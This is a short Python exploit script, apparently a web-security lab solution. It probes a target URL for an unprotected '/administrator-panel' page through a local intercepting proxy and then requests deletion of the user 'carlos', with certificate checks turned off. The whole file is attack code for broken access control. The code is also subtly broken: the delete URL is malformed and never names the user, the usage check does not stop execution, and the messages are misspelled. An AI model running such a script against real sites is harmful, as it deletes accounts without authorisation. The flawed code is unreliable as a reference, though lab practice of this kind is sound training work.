import requests
import  sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies= {"http": "http://127.0.0.1:8080",
          
           "https":"http://127.0.0.1:8080"
           }
def delete_user(url):
    admin_panel_url= url + "/administrator-panel"
    r=requests.get(admin_panel_url, verify=False, proxies=proxies)
    if r.status_code==200:
        print("(+) Found the administator panel")
        print("(+) deleting the user carlos")
        deleting_caros_url= admin_panel_url + "delete"
        r=requests.get(deleting_caros_url, verify=False, proxies=proxies)
        if r.status_code==200:
            print("(+) calos user deleted")
        else:
            print("(-) calos user not deleted")

    else:
        print("(-) administator panel not found")
        print("(-) exiting the script...")

def main():
    if len(sys.argv)!= 2:
        print("(+) usage %s <url>" % sys.argv[0])
        print("(+) example %s www.example.com " % sys.argv[0])
    
    url=sys.argv[1]
    print("(+) finding the admin panel")
    delete_user(url)


if __name__ == "__main__":
    main()